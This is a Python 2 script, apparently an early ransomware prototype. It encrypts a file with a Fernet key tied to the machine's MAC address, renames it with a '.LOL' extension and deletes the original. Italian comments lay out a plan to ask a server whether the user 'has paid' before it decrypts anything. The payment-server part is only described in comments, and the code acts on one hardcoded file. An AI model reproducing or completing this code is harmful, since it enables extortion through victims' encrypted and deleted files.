import os
from uuid import getnode as get_mac
from cryptography.fernet import Fernet


def key_generation(key_path):
    # Put this somewhere safe!
    key = Fernet.generate_key()
    write_file(key_path, key)
    f = Fernet(key)

    print key

    return f


def key_recuva(key_path):
    key = open_file(key_path)
    f = Fernet(key)

    print key

    return f


def crypt(key, data):
    return key.encrypt(data)


def decrypt(key, data):
    return key.decrypt(data)


def open_file(file_name):
    #Read the entire file as a single byte string
    with open(file_name, 'rb') as f:
        data = f.read()

    return data


def write_file(path, file_string):
    with open(path, 'wb') as f:
        f.write(file_string)


def name_and_extension(path):
    name_file = os.path.splitext(os.path.basename(path))[0]
    ext = os.path.splitext(os.path.basename(path))[1]

    return name_file, ext


def still_MAC_Address():
    #transform the integer MAC Address into string with : symbol
    return str ( ':'.join(("%012X" % get_mac() )[i:i + 2] for i in range(0, 12, 2)))


def remove_file(path):
    os.remove(path)


"""Main"""

#MAC Address
mac = still_MAC_Address()
print mac

key_path = 'kiavetta.key'

# se esiste chiavetta, chiedi al server se quell'utente con quel MAC address ha pagato: se si decritta se no Null
# altrimenti, invia la Request con quel MAC address, fai generare al server la chiave, e attraverso Response
# usala per crittare tutto

if os.path.isfile(key_path):
    # 1) Request "ifUserPayed(MACAddress)" if True return Key stored in DB
    # 2) if True Decrypt everything
    key = key_recuva(key_path)
else:
    # 1) Request "newUser(MACAddress)" return Key
    # 2) crypt everything
    key = key_generation(key_path)



#Name File
path= 'photo.jpg.LOL'

#Open file as a string
file_string = open_file(path)

#Take the name file and the its extension
name_file, ext = name_and_extension(path)

if ext == '.LOL':
    # File Decryption
    file_tmp = decrypt(key, file_string)
    # Create a file without .LOL extension
    write_file(name_file, file_tmp)
    remove_file(key_path)
else:
    # File Encryption
    file_tmp = crypt(key, file_string)
    # Create a file with .LOL extension
    write_file(name_file+ext+".LOL", file_tmp)

remove_file(path)



